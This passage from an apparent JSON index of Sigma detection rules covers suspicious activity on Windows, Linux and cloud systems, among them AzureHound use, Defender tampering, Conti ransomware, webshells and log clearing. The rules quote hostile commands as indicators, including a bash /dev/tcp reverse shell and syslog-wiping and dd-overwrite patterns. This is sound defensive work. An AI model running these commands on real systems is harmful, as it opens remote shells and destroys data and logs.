execution of AzureHound in PowerShell, a tool to gather data from Azure for BloodHound references: - https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/AzureHound.ps1 - https://bloodhound.readthedocs.io/en/latest/data-collection/azurehound.html author: Austin Songer (@austinsonger) date: 2021/10/23 modified: 2022/01/12 logsource: product: windows category: ps_script definition: Script Block Logging must be enabled detection: selection: ScriptBlockText|contains: Invoke-AzureHound condition: selection tags: - attack.discovery - attack.t1482 - attack.t1087 - attack.t1087.001 - attack.t1087.002 - attack.t1069.001 - attack.t1069.002 - attack.t1069 falsepositives: - Penetration testing level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_azurehound_commands.yml/","tags":["attack.discovery","attack.t1482","attack.t1087","attack.t1087.001","attack.t1087.002","attack.t1069.001","attack.t1069.002","attack.t1069"],"title":"AzureHound PowerShell Commands"},{"categories":null,"contents":"Detects when a user installs certificates by using CertOC.exe to loads the target DLL file.\nKnown false-positives None References https://twitter.com/sblmsrsn/status/1445758411803480072?s=20 Raw rule (edit) title: Suspicious Load DLL via CertOC.exe id: 242301bc-f92f-4476-8718-78004a6efd9f description: Detects when a user installs certificates by using CertOC.exe to loads the target DLL file. status: experimental author: Austin Songer @austinsonger date: 2021/10/23 references: - https://twitter.com/sblmsrsn/status/1445758411803480072?s=20 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\certoc.exe\u0026#39; CommandLine|contains|all: - \u0026#39;-LoadDLL\u0026#39; - \u0026#39;.dll\u0026#39; condition: selection fields: - CommandLine - ParentCommandLine tags: - attack.defense_evasion - attack.t1218 level: medium falsepositives: - None ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_certoc_execution.yml/","tags":["attack.defense_evasion","attack.t1218"],"title":"Suspicious Load DLL via CertOC.exe"},{"categories":null,"contents":"Detects the use of stordiag.exe to execute schtasks.exe systeminfo.exe and fltmc.exe\nKnown false-positives Legitimate usage of stordiag.exe. References https://strontic.github.io/xcyclopedia/library/stordiag.exe-1F08FC87C373673944F6A7E8B18CD845.html https://twitter.com/eral4m/status/1451112385041911809 Raw rule (edit) title: Execution via stordiag.exe id: 961e0abb-1b1e-4c84-a453-aafe56ad0d34 status: experimental description: Detects the use of stordiag.exe to execute schtasks.exe systeminfo.exe and fltmc.exe references: - https://strontic.github.io/xcyclopedia/library/stordiag.exe-1F08FC87C373673944F6A7E8B18CD845.html - https://twitter.com/eral4m/status/1451112385041911809 tags: - attack.defense_evasion - attack.t1218 author: Austin Songer (@austinsonger) date: 2021/10/21 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\stordiag.exe\u0026#39; Image|endswith: - \u0026#39;\\schtasks.exe\u0026#39; - \u0026#39;\\systeminfo.exe\u0026#39; - \u0026#39;\\fltmc.exe\u0026#39; filter: ParentImage|startswith: # as first is \u0026#34;Copy c:\\windows\\system32\\stordiag.exe to a folder\u0026#34; - \u0026#39;c:\\windows\\system32\\\u0026#39; - \u0026#39;c:\\windows\\syswow64\\\u0026#39; condition: selection and not filter falsepositives: - Legitimate usage of stordiag.exe. level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_stordiag_execution.yml/","tags":["attack.defense_evasion","attack.t1218"],"title":"Execution via stordiag.exe"},{"categories":null,"contents":"Detects using WorkFolders.exe to execute an arbitrary control.exe\nKnown false-positives Legitimate usage of the uncommon Windows Work Folders feature. References https://twitter.com/elliotkillick/status/1449812843772227588 Raw rule (edit) title: Execution via WorkFolders.exe id: 0bbc6369-43e3-453d-9944-cae58821c173 status: experimental description: Detects using WorkFolders.exe to execute an arbitrary control.exe references: - https://twitter.com/elliotkillick/status/1449812843772227588 tags: - attack.defense_evasion - attack.t1218 author: Maxime Thiebaut (@0xThiebaut) date: 2021/10/21 logsource: category: process_creation product: windows definition: \u0026#39;Requirements: Sysmon ProcessCreation logging must be activated\u0026#39; detection: selection: Image|endswith: \u0026#39;\\control.exe\u0026#39; ParentImage|endswith: \u0026#39;\\WorkFolders.exe\u0026#39; filter: Image: \u0026#39;C:\\Windows\\System32\\control.exe\u0026#39; condition: selection and not filter falsepositives: - Legitimate usage of the uncommon Windows Work Folders feature. level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_workfolders.yml/","tags":["attack.defense_evasion","attack.t1218"],"title":"Execution via WorkFolders.exe"},{"categories":null,"contents":"Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.003/T1564.003.md Raw rule (edit) title: Suspicious PowerShell WindowStyle Option id: 313fbb0a-a341-4682-848d-6d6f8c4fab7c status: experimental references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.003/T1564.003.md description: Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden tags: - attack.defense_evasion - attack.t1564.003 author: frack113 date: 2021/10/20 logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains|all: - \u0026#39;powershell\u0026#39; - \u0026#39;WindowStyle\u0026#39; - \u0026#39;Hidden\u0026#39; condition: selection falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_suspicious_windowstyle.yml/","tags":["attack.defense_evasion","attack.t1564.003"],"title":"Suspicious PowerShell WindowStyle Option"},{"categories":null,"contents":"Detects use of executionpolicy option to set a unsecure policies\nKnown false-positives Administrator script References https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7.1 https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.1 https://adsecurity.org/?p=2604 https://thedfirreport.com/2021/11/01/from-zero-to-domain-admin/ Raw rule (edit) title: Change PowerShell Policies to an Unsecure Level id: 87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180 description: Detects use of executionpolicy option to set a unsecure policies status: experimental references: - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7.1 - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.1 - https://adsecurity.org/?p=2604 - https://thedfirreport.com/2021/11/01/from-zero-to-domain-admin/ tags: - attack.execution - attack.t1059.001 author: frack113 date: 2021/11/01 modified: 2022/02/23 logsource: product: windows category: process_creation detection: option: CommandLine|contains: - \u0026#39; -executionpolicy \u0026#39; - \u0026#39; -ep \u0026#39; - \u0026#39; -exec \u0026#39; level: CommandLine|contains: - \u0026#39;Unrestricted\u0026#39; - \u0026#39;bypass\u0026#39; - \u0026#39;RemoteSigned\u0026#39; condition: option and level falsepositives: - Administrator script level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_set_policies_to_unsecure_level.yml/","tags":["attack.execution","attack.t1059.001"],"title":"Change PowerShell Policies to an Unsecure Level"},{"categories":null,"contents":"Attempts to detect registry events for common NetWire key HKCU\\Software\\NetWire\nKnown false-positives No known false positives References https://www.fortinet.com/blog/threat-research/new-netwire-rat-variant-spread-by-phishing https://resources.infosecinstitute.com/topic/netwire-malware-what-it-is-how-it-works-and-how-to-prevent-it-malware-spotlight/ https://unit42.paloaltonetworks.com/guloader-installing-netwire-rat/ https://blogs.blackberry.com/en/2021/09/threat-thursday-netwire-rat-is-coming-down-the-line https://app.any.run/tasks/41ecdbde-4997-4301-a350-0270448b4c8f/ Raw rule (edit) title: NetWire RAT Registry Key id: 1d218616-71b0-4c40-855b-9dbe75510f7f description: Attempts to detect registry events for common NetWire key HKCU\\Software\\NetWire Note: You likely will have to change the sysmon configuration file. Per SwiftOnSecurity \u0026#34;Because Sysmon runs as a service, it has no filtering ability for, or concept of, HKCU or HKEY_CURRENT_USER. Use \u0026#34;contains\u0026#34; or \u0026#34;end with\u0026#34; to get around this limitation\u0026#34; Therefore I set \u0026lt;TargetObject condition=\u0026#34;contains\u0026#34;\u0026gt;netwire\u0026lt;/TargetObjecct\u0026gt; in my configuration. status: experimental references: - https://www.fortinet.com/blog/threat-research/new-netwire-rat-variant-spread-by-phishing - https://resources.infosecinstitute.com/topic/netwire-malware-what-it-is-how-it-works-and-how-to-prevent-it-malware-spotlight/ - https://unit42.paloaltonetworks.com/guloader-installing-netwire-rat/ - https://blogs.blackberry.com/en/2021/09/threat-thursday-netwire-rat-is-coming-down-the-line - https://app.any.run/tasks/41ecdbde-4997-4301-a350-0270448b4c8f/ tags: - attack.defense_evasion - attack.t1112 #The configuration information is usually stored under HKCU:\\Software\\Netwire - RedCanary date: 2021/10/07 author: Christopher Peacock level: high logsource: product: windows category: registry_event detection: selection1: TargetObject|contains: \u0026#39;\\software\\NetWire\u0026#39; condition: selection1 falsepositives: - No known false positives ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_mal_netwire.yml/","tags":["attack.defense_evasion","attack.t1112"],"title":"NetWire RAT Registry Key"},{"categories":null,"contents":"Detects the deletion of registry keys containing the MSTSC connection history\nKnown false-positives unknown References https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/remove-entries-from-remote-desktop-connection-computer http://woshub.com/how-to-clear-rdp-connections-history/ Raw rule (edit) title: Terminal Server Client Connection History Cleared id: 07bdd2f5-9c58-4f38-aec8-e101bb79ef8d description: Detects the deletion of registry keys containing the MSTSC connection history references: - https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/remove-entries-from-remote-desktop-connection-computer - http://woshub.com/how-to-clear-rdp-connections-history/ tags: - attack.defense_evasion - attack.t1070 - attack.t1112 author: Christian Burkard status: experimental date: 2021/10/19 logsource: category: registry_event product: windows detection: selection1: EventType: DeleteValue TargetObject|contains: \u0026#39;\\Microsoft\\Terminal Server Client\\Default\\MRU\u0026#39; selection2: EventType: DeleteKey TargetObject|contains: \u0026#39;\\Microsoft\\Terminal Server Client\\Servers\\\u0026#39; condition: 1 of selection* falsepositives: - unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_mstsc_history_cleared.yml/","tags":["attack.defense_evasion","attack.t1070","attack.t1112"],"title":"Terminal Server Client Connection History Cleared"},{"categories":null,"contents":"Detects disabling Windows Defender Real-Time Protection by modifying registry\nKnown false-positives Administrator actions References https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/ https://gist.github.com/anadr/7465a9fde63d41341136949f14c21105 Raw rule (edit) title: Windows Defender Real-Time Protection Disabled id: fd115e64-97c7-491f-951c-fc8da7e042fa description: Detects disabling Windows Defender Real-Time Protection by modifying registry date: 2021/10/18 author: AlertIQ references: - https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/ - https://gist.github.com/anadr/7465a9fde63d41341136949f14c21105 status: experimental tags: - attack.defense_evasion - attack.t1562.001 logsource: product: windows category: registry_event detection: tamper_registry1: EventType: SetValue TargetObject: - \u0026#39;HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableBehaviorMonitoring\u0026#39; - \u0026#39;HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableIOAVProtection\u0026#39; - \u0026#39;HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableOnAccessProtection\u0026#39; - \u0026#39;HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring\u0026#39; - \u0026#39;HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableScanOnRealtimeEnable\u0026#39; - \u0026#39;HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\SpyNet\\DisableBlockAtFirstSeen\u0026#39; Details: \u0026#39;DWORD (0x00000001)\u0026#39; tamper_registry2: EventType: SetValue TargetObject: - \u0026#39;HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\SpyNet\\SpynetReporting\u0026#39; - \u0026#39;HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\SpyNet\\SubmitSamplesConsent\u0026#39; Details: \u0026#39;DWORD (0x00000000)\u0026#39; condition: tamper_registry1 or tamper_registry2 falsepositives: - Administrator actions level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_defender_realtime_protection_disabled.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"Windows Defender Real-Time Protection Disabled"},{"categories":null,"contents":"Detects a bash contecting to a remote IP address (often found when actors do something like \u0026lsquo;bash -i \u0026gt;\u0026amp; /dev/tcp/10.0.0.1/4242 0\u0026gt;\u0026amp;1\u0026rsquo;)\nKnown false-positives Unknown References https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md Raw rule (edit) title: Linux Reverse Shell Indicator id: 83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871 status: experimental description: Detects a bash contecting to a remote IP address (often found when actors do something like \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.0.0.1/4242 0\u0026gt;\u0026amp;1\u0026#39;) references: - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md date: 2021/10/16 author: Florian Roth logsource: product: linux category: network_connection detection: selection: Image|endswith: \u0026#39;/bin/bash\u0026#39; filter: DestinationIp: - \u0026#39;127.0.0.1\u0026#39; - \u0026#39;0.0.0.0\u0026#39; condition: selection and not filter falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml/","tags":null,"title":"Linux Reverse Shell Indicator"},{"categories":null,"contents":"Detects creation of cron files or files in Cron directories. Potential persistence.\nKnown false-positives Any legitimate cron file. References https://github.com/microsoft/MSTIC-Sysmon/blob/main/linux/configs/attack-based/persistence/T1053.003_Cron_Activity.xml Raw rule (edit) title: Cron Files id: 6c4e2f43-d94d-4ead-b64d-97e53fa2bd05 status: experimental description: Detects creation of cron files or files in Cron directories. Potential persistence. date: 2021/10/15 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC tags: - attack.persistence - attack.t1053.003 references: - https://github.com/microsoft/MSTIC-Sysmon/blob/main/linux/configs/attack-based/persistence/T1053.003_Cron_Activity.xml logsource: product: linux category: file_create detection: selection1: TargetFilename|startswith: - \u0026#39;/etc/cron.d/\u0026#39; - \u0026#39;/etc/cron.daily/\u0026#39; - \u0026#39;/etc/cron.hourly/\u0026#39; - \u0026#39;/etc/cron.monthly/\u0026#39; - \u0026#39;/etc/cron.weekly/\u0026#39; - \u0026#39;/var/spool/cron/crontabs/\u0026#39; selection2: TargetFilename|contains: - \u0026#39;/etc/cron.allow\u0026#39; - \u0026#39;/etc/cron.deny\u0026#39; - \u0026#39;/etc/crontab\u0026#39; condition: selection1 or selection2 falsepositives: - Any legitimate cron file. level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/file_create/cron_files.yml/","tags":["attack.persistence","attack.t1053.003"],"title":"Cron Files"},{"categories":null,"contents":"Detect when a Cloud SQL DB has been modified or deleted.\nKnown false-positives SQL Database being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. SQL Database modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://cloud.google.com/sql/docs/mysql/admin-api/rest/v1beta4/users/update Raw rule (edit) title: Google Cloud SQL Database Modified or Deleted id: f346bbd5-2c4e-4789-a221-72de7685090d description: Detect when a Cloud SQL DB has been modified or deleted. author: Austin Songer @austinsonger status: experimental date: 2021/10/15 references: - https://cloud.google.com/sql/docs/mysql/admin-api/rest/v1beta4/users/update logsource: product: gcp service: gcp.audit detection: selection: gcp.audit.method_name: - cloudsql.instances.create - cloudsql.instances.delete - cloudsql.users.update - cloudsql.users.delete condition: selection level: medium tags: - attack.impact falsepositives: - SQL Database being modified or deleted may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - SQL Database modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/gcp/gcp_sql_database_modified_or_deleted.yml/","tags":["attack.impact"],"title":"Google Cloud SQL Database Modified or Deleted"},{"categories":null,"contents":"Detects attempts to collect data stored in the clipboard from users with the usage of xclip tool. Xclip has to be installed. Highly recommended using rule on servers, due to high usage of clipboard utilities on user workstations.\nKnown false-positives Legitimate usage of xclip tools. References https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_clipboard_collection.yml Raw rule (edit) title: Clipboard Collection with Xclip Tool id: ec127035-a636-4b9a-8555-0efd4e59f316 status: experimental description: Detects attempts to collect data stored in the clipboard from users with the usage of xclip tool. Xclip has to be installed. Highly recommended using rule on servers, due to high usage of clipboard utilities on user workstations. date: 2021/10/15 author: Pawel Mazur, Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC tags: - attack.impact - attack.t1485 references: - https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_clipboard_collection.yml logsource: product: linux category: process_creation detection: selection1: Image|contains: \u0026#39;xclip\u0026#39; selection2: CommandLine|contains: - \u0026#39;-selection\u0026#39; - \u0026#39;-sel\u0026#39; selection3: CommandLine|contains: - \u0026#39;clipboard\u0026#39; - \u0026#39;clip\u0026#39; selection4: CommandLine|contains: \u0026#39;-o\u0026#39; condition: selection1 and selection2 and selection3 and selection4 falsepositives: - Legitimate usage of xclip tools. level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/process_creation/proc_creation_lnx_clipboard_collection.yml/","tags":["attack.impact","attack.t1485"],"title":"Clipboard Collection with Xclip Tool"},{"categories":null,"contents":"Detects specific commands commonly used to remove or empty the syslog.\nKnown false-positives Log rotation. References https://github.com/SigmaHQ/sigma/blob/master/rules/linux/lnx_clear_syslog.yml Raw rule (edit) title: Commands to Clear or Remove the Syslog id: 3fcc9b35-39e4-44c0-a2ad-9e82b6902b31 status: experimental description: Detects specific commands commonly used to remove or empty the syslog. date: 2021/10/15 author: Max Altgelt, Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC tags: - attack.impact - attack.t1565.001 references: - https://github.com/SigmaHQ/sigma/blob/master/rules/linux/lnx_clear_syslog.yml logsource: product: linux category: process_creation detection: selection: CommandLine|contains: - \u0026#39;rm /var/log/syslog\u0026#39; - \u0026#39;rm -r /var/log/syslog\u0026#39; - \u0026#39;rm -f /var/log/syslog\u0026#39; - \u0026#39;rm -rf /var/log/syslog\u0026#39; - \u0026#39;mv /var/log/syslog\u0026#39; - \u0026#39; \u0026gt;/var/log/syslog\u0026#39; - \u0026#39; \u0026gt; /var/log/syslog\u0026#39; condition: selection falsepositives: - Log rotation. level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/process_creation/proc_creation_lnx_clear_syslog.yml/","tags":["attack.impact","attack.t1565.001"],"title":"Commands to Clear or Remove the Syslog"},{"categories":null,"contents":"Detects potential overwriting and deletion of a file using DD.\nKnown false-positives Any user deleting files that way. References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1485/T1485.md#atomic-test-2---macoslinux---overwrite-file-with-dd Raw rule (edit) title: DD File Overwrite id: 2953194b-e33c-4859-b9e8-05948c167447 status: experimental description: Detects potential overwriting and deletion of a file using DD. date: 2021/10/15 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC tags: - attack.impact - attack.t1485 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1485/T1485.md#atomic-test-2---macoslinux---overwrite-file-with-dd logsource: product: linux category: process_creation detection: selection1: Image: \u0026#39;/bin/dd\u0026#39; selection2: CommandLine|contains: \u0026#39;of=\u0026#39; selection3: CommandLine|contains: - \u0026#39;if=/dev/zero\u0026#39; - \u0026#39;if=/dev/null\u0026#39; condition: selection1 and selection2 and selection3 falsepositives: - Any user deleting files that way. level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/process_creation/proc_creation_lnx_dd_file_overwrite.yml/","tags":["attack.impact","attack.t1485"],"title":"DD File Overwrite"},{"categories":null,"contents":"Detects suspicious sub processes of web server processes\nKnown false-positives Web applications that invoke Linux command line tools References https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/ Raw rule (edit) title: Linux Webshell Indicators id: 818f7b24-0fba-4c49-a073-8b755573b9c7 status: experimental description: Detects suspicious sub processes of web server processes references: - https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/ date: 2021/10/15 author: Florian Roth tags: - attack.persistence - attack.t1505.003 logsource: product: linux category: process_creation detection: selection_general: ParentImage|endswith: - \u0026#39;/httpd\u0026#39; - \u0026#39;/lighttpd\u0026#39; - \u0026#39;/nginx\u0026#39; - \u0026#39;/apache2\u0026#39; - \u0026#39;/node\u0026#39; selection_tomcat: ParentCommandLine|contains|all: - \u0026#39;/bin/java\u0026#39; - \u0026#39;tomcat\u0026#39; selection_websphere: # ? just guessing ParentCommandLine|contains|all: - \u0026#39;/bin/java\u0026#39; - \u0026#39;websphere\u0026#39; selection_sub_processes: Image|endswith: - \u0026#39;/whoami\u0026#39; - \u0026#39;/ifconfig\u0026#39; - \u0026#39;/usr/bin/ip\u0026#39; - \u0026#39;/bin/uname\u0026#39; condition: selection_sub_processes and ( selection_general or selection_tomcat ) falsepositives: - Web applications that invoke Linux command line tools level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/process_creation/proc_creation_lnx_webshell_detection.yml/","tags":["attack.persistence","attack.t1505.003"],"title":"Linux Webshell Indicators"},{"categories":null,"contents":"Conti ransomware command line ioc\nKnown false-positives Unknown should be low References https://news.sophos.com/en-us/2021/09/03/conti-affiliates-use-proxyshell-exchange-exploit-in-ransomware-attacks/ https://twitter.com/VK_Intel/status/1447795359900704769?t=Xz7vaLTvaaCZ5kHoZa6gMw\u0026amp;s=19 Raw rule (edit) title: Conti Ransomware Execution id: 689308fc-cfba-4f72-9897-796c1dc61487 status: experimental author: frack113 date: 2021/10/12 description: Conti ransomware command line ioc references: - https://news.sophos.com/en-us/2021/09/03/conti-affiliates-use-proxyshell-exchange-exploit-in-ransomware-attacks/ - https://twitter.com/VK_Intel/status/1447795359900704769?t=Xz7vaLTvaaCZ5kHoZa6gMw\u0026amp;s=19 tags: - attack.impact - attack.s0575 - attack.t1486 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;-m \u0026#39; - \u0026#39;-net \u0026#39; - \u0026#39;-size \u0026#39; #size 10 in references - \u0026#39;-nomutex \u0026#39; - \u0026#39;-p \\\\\u0026#39; - \u0026#39;$\u0026#39; condition: selection falsepositives: - Unknown should be low level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_conti_cmd_ransomware.yml/","tags":["attack.impact","attack.s0575","attack.t1486"],"title":"Conti Ransomware Execution"},{"categories":null,"contents":"Detects when a user disables the Windows Firewall via a Profile to help evade defense.\nKnown false-positives Unknown References https://docs.microsoft.com/en-us/powershell/module/netsecurity/set-netfirewallprofile?view=windowsserver2019-ps https://www.tutorialspoint.com/how-to-get-windows-firewall-profile-settings-using-powershell http://powershellhelp.space/commands/set-netfirewallrule-psv5.php http://woshub.com/manage-windows-firewall-powershell/ Raw rule (edit) title: Windows Firewall Profile Disabled id: 488b44e7-3781-4a71-888d-c95abfacf44d description: Detects when a user disables the Windows Firewall via a Profile to help evade defense. status: experimental author: Austin Songer @austinsonger date: 2021/10/12 modified: 2021/10/16 references: - https://docs.microsoft.com/en-us/powershell/module/netsecurity/set-netfirewallprofile?view=windowsserver2019-ps - https://www.tutorialspoint.com/how-to-get-windows-firewall-profile-settings-using-powershell - http://powershellhelp.space/commands/set-netfirewallrule-psv5.php - http://woshub.com/manage-windows-firewall-powershell/ logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains|all: - Set-NetFirewallProfile - -Profile - -Enabled - \u0026#39;False\u0026#39; condition: selection tags: - attack.defense_evasion - attack.t1562.004 level: high falsepositives: - Unknown ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_windows_firewall_profile_disabled.yml/","tags":["attack.defense_evasion","attack.t1562.004"],"title":"Windows Firewall Profile Disabled"},{"categories":null,"contents":"Detects when an user acount is locked or suspended.\nKnown false-positives System may lock or suspend user accounts. References https://developers.onelogin.com/api-docs/1/events/event-resource/ Raw rule (edit) title: OneLogin User Account Locked id: a717c561-d117-437e-b2d9-0118a7035d01 description: Detects when an user acount is locked or suspended. author: Austin Songer @austinsonger status: experimental date: 2021/10/12 modified: 2021/10/12 references: - https://developers.onelogin.com/api-docs/1/events/event-resource/ logsource: product: onelogin service: onelogin.events detection: selection1: # Locked via API event_type_id: 532 selection2: # Locked via API event_type_id: 553 selection3: # Suspended via API event_type_id: 551 condition: 1 of selection* level: low tags: - attack.impact falsepositives: - System may lock or suspend user accounts. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/onelogin/onelogin_user_account_locked.yml/","tags":["attack.impact"],"title":"OneLogin User Account Locked"},{"categories":null,"contents":"Detects when an user assumed another user account.\nKnown false-positives Unknown References https://developers.onelogin.com/api-docs/1/events/event-resource Raw rule (edit) title: OneLogin User Assumed Another User id: 62fff148-278d-497e-8ecd-ad6083231a35 description: Detects when an user assumed another user account. author: Austin Songer @austinsonger status: experimental date: 2021/10/12 modified: 2021/10/12 references: - https://developers.onelogin.com/api-docs/1/events/event-resource logsource: product: onelogin service: onelogin.events detection: selection: event_type_id: 3 condition: selection level: low tags: - attack.impact falsepositives: - Unknown ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/onelogin/onelogin_assumed_another_user.yml/","tags":["attack.impact"],"title":"OneLogin User Assumed Another User"},{"categories":null,"contents":"Identifies user account which has been locked because the user tried to sign in too many times with an incorrect user ID or password.\nKnown false-positives Unknown References https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/security-operations-privileged-accounts Raw rule (edit) title: Account Lockout id: 2b7d6fc0-71ac-4cf7-8ed1-b5788ee5257a status: experimental author: AlertIQ date: 2021/10/10 description: Identifies user account which has been locked because the user tried to sign in too many times with an incorrect user ID or password. references: - https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/security-operations-privileged-accounts logsource: product: azure service: azure.signinlogs detection: selection: ResultType: 50053 condition: selection level: medium falsepositives: - Unknown tags: - attack.credential_access - attack.t1110 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_account_lockout.yml/","tags":["attack.credential_access","attack.t1110"],"title":"Account Lockout"},{"categories":null,"contents":"Change to authentication method could be an indicated of an attacker adding an auth method to the account so they can have continued access.\nKnown false-positives Unknown References https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/security-operations-privileged-accounts Raw rule (edit) title: Change to Authentication Method id: 4d78a000-ab52-4564-88a5-7ab5242b20c7 status: experimental author: AlertIQ date: 2021/10/10 description: Change to authentication method could be an indicated of an attacker adding an auth method to the account so they can have continued access. references: - https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/security-operations-privileged-accounts logsource: product: azure service: azure.auditlogs detection: selection: LoggedByService: \u0026#39;Authentication Methods\u0026#39; Category: \u0026#39;UserManagement\u0026#39; OperationName: \u0026#39;User registered security info\u0026#39; condition: selection level: medium falsepositives: - Unknown tags: - attack.credential_access ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_change_to_authentication_method.yml/","tags":["attack.credential_access"],"title":"Change to Authentication Method"},{"categories":null,"contents":"Detect failed attempts to sign in to disabled accounts.\nKnown false-positives Unknown References https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/security-operations-privileged-accounts Raw rule (edit) title: Login to Disabled Account id: 908655e0-25cf-4ae1-b775-1c8ce9cf43d8 status: experimental author: AlertIQ date: 2021/10/10 description: Detect failed attempts to sign in to disabled accounts. references: - https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/security-operations-privileged-accounts logsource: product: azure service: azure.signinlogs detection: selection: ResultType: 50057 ResultDescription: \u0026#39;User account is disabled. The account has been disabled by an administrator.\u0026#39; condition: selection level: medium falsepositives: - Unknown tags: - attack.initial_access - attack.t1078 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_login_to_disabled_account.yml/","tags":["attack.initial_access","attack.t1078"],"title":"Login to Disabled Account"},{"categories":null,"contents":"Identifies user login with multifactor authentication failures, which might be an indication an attacker has the password for the account but can\u0026rsquo;t pass the MFA challenge.\nKnown false-positives Unknown References https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/security-operations-privileged-accounts Raw rule (edit) title: Multifactor Authentication Interupted id: 5496ff55-42ec-4369-81cb-00f417029e25 status: experimental author: AlertIQ date: 2021/10/10 description: Identifies user login with multifactor authentication failures, which might be an indication an attacker has the password for the account but can\u0026#39;t pass the MFA challenge. references: - https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/security-operations-privileged-accounts logsource: product: azure service: azure.signinlogs detection: selection: ResultType: 50074 ResultDescription|contains: \u0026#39;Strong Auth required\u0026#39; selection1: ResultType: 500121 ResultDescription|contains: \u0026#39;Authentication failed during strong authentication 